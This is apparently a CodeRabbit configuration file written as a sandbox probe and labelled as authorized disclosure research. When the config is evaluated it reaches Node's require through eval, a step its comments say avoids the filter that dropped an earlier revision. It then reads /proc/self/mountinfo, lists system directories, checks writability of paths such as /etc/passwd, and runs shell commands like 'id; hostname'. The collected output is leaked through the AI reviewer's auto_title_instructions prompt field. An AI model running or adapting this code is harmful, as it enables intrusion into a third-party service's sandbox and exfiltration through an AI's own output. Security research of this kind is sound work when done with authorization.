// CodeRabbit config probe CR-132-INT-E (authorized VDP research on our own PR).
// Revision E of the cr/tscfg-112-head payload channel (probe 121 revs A-D).
// GOAL: does the evaluation sandbox permit WRITES where writing would matter, and does
// node:child_process actually execute a binary?  NOTHING IS WRITTEN, DELETED OR MODIFIED
// anywhere on disk: the only write-shaped call is fs.accessSync(..., W_OK), a permission
// query that creates no file.  The only child processes are /bin/true, /bin/sh -c id,
// /usr/bin/id and test -w, none of which touch the filesystem.
// No module-loading syntax anywhere (probe 121 rev A was silently dropped for it); Node
// built-ins are reached through the MODULE-SCOPE require, invisible on globalThis.

const MARK = "CR-132-INT-E"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, ".")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 150))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(
      t + "!x",
      e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR",
    )
    return undefined
  }
}

function errcode(e: any): string {
  return e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR"
}

// ---- who / where / which jail ------------------------------------------------
safe("A.proc", () => {
  const p: any = (globalThis as any).process
  return (
    "uid=" + p.getuid() + " gid=" + p.getgid() + " pid=" + p.pid + " ppid=" + p.ppid +
    " cwd=" + p.cwd() + " execPath=" + p.execPath
  )
})
safe("A.bundle", () => {
  const d = eval("__dirname")
  const f = eval("__filename")
  return "dirname=" + clip(d, 60) + " filename=" + clip(f, 60)
})
const rt = safe("B.require", () => eval("typeof require"))

if (rt === "function") {
  const fs: any = eval("require")("node:fs")
  const C: any = fs.constants
  rec("C.consts", "F_OK=" + C.F_OK + " R_OK=" + C.R_OK + " W_OK=" + C.W_OK + " X_OK=" + C.X_OK)

  // ---------------- jail identity / freshness --------------------------------
  safe("C.jail_uuid", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const g = m.match(/nsjail-[0-9a-f-]+/)
    return g ? g[0] : "no-nsjail-id::" + clip(m.slice(0, 140), 140)
  })
  safe("C.ls_root", () => fs.readdirSync("/").join(","))
  safe("C.ls_tmp", () => fs.readdirSync("/tmp").join(","))
  safe("C.cwd_link", () => {
    try {
      return fs.readlinkSync("/proc/self/cwd")
    } catch (e: any) {
      return "readlink " + errcode(e)
    }
  })

  // ---------------- P1a: WRITABILITY QUERY. ZERO writes. ---------------------
  // W_OK on a directory answers: may this process create/rename entries here?
  // W_OK on a file answers: may this process truncate/rewrite it?
  const paths = [
    "/",
    "/tmp",
    "/tmp/coderabbit-config.cjs",
    "/app",
    "/app/cr-jail-fs",
    "/app/cr-gcs-transfer",
    "/etc",
    "/etc/passwd",
    "/etc/hosts",
    "/home",
    "/home/jailuser",
    "/home/jailuser/.cache",
    "/usr/local/lib/node_modules",
    "/usr/local/bin/node",
    "/dev/shm",
    "/run",
    "/codegraph-runtime",
    "/verification-runtime",
    "/knowledge-embedding-runtime",
    "/proc/self",
    // CONTROL 1 -- a path that certainly does not exist, must be ENOENT not success
    "/etc/cr-132-no-such-dir-4471",
  ]
  for (const p of paths) {
    const k = "W:" + p
    safe(k, () => {
      fs.accessSync(p, C.W_OK)
      return "WRITABLE"
    })
  }
  // same paths, ownership + mode, so every verdict above is explainable
  for (const p of ["/", "/tmp", "/etc", "/home/jailuser", "/dev/shm", "/usr/local/lib/node_modules", "/tmp/coderabbit-config.cjs"]) {
    safe("S:" + p, () => {
      const st = fs.statSync(p)
      return "mode=" + (st.mode & 4095).toString(8) + " uid=" + st.uid + " gid=" + st.gid + " nlink=" + st.nlink + " ino=" + st.ino + " size=" + st.size
    })
  }
  // CONTROL 2 -- read-only but definitely existing paths must come back denied,
  // proving this probe discriminates readable from writable
  for (const p of ["/etc/passwd", "/usr/local/bin/node", "/etc/shadow", "/home"]) {
    safe("R:" + p, () => {
      fs.accessSync(p, C.R_OK)
      return "READABLE"
    })
  }
  // is the repository checkout present in the jail at all?
  for (const d of ["/.git", "/workspace", "/repo", "/github/workspace", "/src", "/data", "/mnt"]) {
    safe("C.dir" + d.replace(/\//g, "_"), () => {
      try {
        return "DIR " + fs.readdirSync(d).join(",")
      } catch (e: any) {
        return "ERR " + errcode(e)
      }
    })
  }

  // ---------------- P1b: does child_process actually EXECUTE? -----------------
  const cp: any = eval("require")("node:child_process")
  rec("D.cp_type", typeof cp + " execSync=" + typeof cp.execSync + " spawnSync=" + typeof cp.spawnSync)
  safe("D.exec_true", () => {
    const b = cp.execFileSync("/bin/true", [], { timeout: 5000 })
    return "OK bufferType=" + (b && b.constructor ? b.constructor.name : "?") + " len=" + (b ? b.length : -1)
  })
  safe("D.exec_sh_id", () => {
    const s = String(cp.execFileSync("/bin/sh", ["-c", "id"], { timeout: 5000, encoding: "utf8" }))
    return "OK [" + clip(s, 120) + "]"
  })
  safe("D.exec_id_direct", () => {
    const s = String(cp.execFileSync("/usr/bin/id", [], { timeout: 5000, encoding: "utf8" }))
    return "OK [" + clip(s, 120) + "]"
  })
  safe("D.spawn_sh_id", () => {
    const r = cp.spawnSync("/bin/sh", ["-c", "id; hostname"], { timeout: 5000, encoding: "utf8" })
    return "status=" + r.status + " err=" + (r.error ? errcode(r.error) : "none") + " out=[" + clip(r.stdout, 110) + "]"
  })
  // second, independent writability oracle, from a separate process
  safe("D.sh_test_w", () => {
    const s = String(cp.execFileSync("/bin/sh", ["-c", "test -w /tmp && echo T || echo F; test -w / && echo T || echo F; test -w /etc && echo T || echo F"], { timeout: 5000, encoding: "utf8" }))
    return "[" + clip(s, 60) + "]"
  })
} else {
  rec("B.body", "SKIPPED_no_module_scope_require")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
